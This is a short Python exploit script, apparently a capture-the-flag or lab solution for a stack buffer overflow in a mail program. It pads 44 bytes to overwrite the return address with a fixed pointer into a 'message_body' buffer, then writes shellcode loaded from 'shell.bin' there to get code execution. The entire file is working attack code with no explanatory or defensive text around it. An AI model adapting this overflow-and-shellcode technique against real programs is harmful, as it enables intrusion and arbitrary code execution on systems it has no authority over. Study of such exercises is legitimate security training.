#!/usr/bin/python
import sys
import struct


# distance between mail_subject and rip was 44 bytes
string = "a"*44
payload = open("shell.bin").read()

# jump to the mesage_body and write in the shell code
pointer = 0x804a060
sys.stdout.write(string + struct.pack("@P", pointer) + "\n")
sys.stdout.write(payload + "\n")


